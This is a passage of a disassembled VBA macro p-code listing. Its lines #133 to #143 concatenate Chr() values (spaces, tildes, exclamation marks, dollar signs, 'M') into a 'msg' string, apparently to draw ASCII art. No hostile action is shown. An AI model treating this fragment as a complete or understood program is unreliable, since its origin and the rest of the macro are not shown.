' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #133:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #134:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #135:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #136:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #137:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #138:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #139:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #140:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #141:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #142:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #143:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
